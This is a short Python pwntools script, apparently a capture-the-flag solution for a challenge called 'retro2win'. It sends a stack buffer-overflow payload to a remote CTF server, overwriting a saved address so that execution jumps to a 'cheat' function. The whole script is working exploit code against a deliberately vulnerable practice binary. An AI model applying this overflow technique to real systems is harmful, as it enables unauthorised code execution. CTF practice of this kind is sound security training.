from pwn import *

e = ELF("retro2win")

p = e.process()

gdb.attach(p,"""
	break  enter_cheatcode
""")
p=remote("retro2win.ctf.intigriti.io", 1338)
cheat_addr = 0x40076a
write_addr = 0x602400

print(p.recv().decode("utf-8"))
p.sendline("1337")

print(p.recv())
sh = b'#'*8 +b'B'*8 + p64(write_addr) + p64(cheat_addr) +b'#'*8 +b'B'*8 +b'#'*8 +b'B'*8 
p.sendline(sh)
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
